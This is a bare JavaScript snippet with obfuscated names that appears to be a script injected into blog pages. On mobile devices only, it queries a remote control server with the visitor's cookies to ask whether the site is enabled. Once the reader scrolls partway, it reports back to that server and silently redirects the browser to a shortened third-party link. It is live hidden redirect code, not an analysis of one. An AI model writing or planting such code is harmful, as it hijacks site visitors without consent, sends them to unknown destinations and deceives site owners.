(() => {
const qx = "https://vo.la/XFCi3hK";
const mz = "https://tistory.supportgg.com/tistory_api.php";
const aa = 500;
const bb = 0.5;

const zt = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
if (!zt) return;

const kk = location.hostname.replace(/^www\./, '');
let yy = false;

fetch(mz + "?act=check&site=" + encodeURIComponent(kk), {
credentials: "include",
cache: "no-store"
})
.then(r => r.json())
.then(p => {
if (!p || !p.allowed) return;

const v = () => {
const n = window.pageYOffset || document.documentElement.scrollTop;
const m = document.documentElement.scrollHeight - window.innerHeight || 1;
return { n, m: n / m };
};

const u = () => {
if (yy) return;
yy = true;

fetch(mz + "?act=mark&site=" + encodeURIComponent(kk), {
method: "GET",
credentials: "include",
keepalive: true,
cache: "no-store"
}).catch(() => {});

location.href = qx;
};

const w = () => {
const { n, m } = v();
if (n >= aa || m >= bb) u();
};

window.addEventListener("scroll", w, { passive: true });
window.addEventListener("touchmove", w, { passive: true });
})
.catch(() => {});
})();
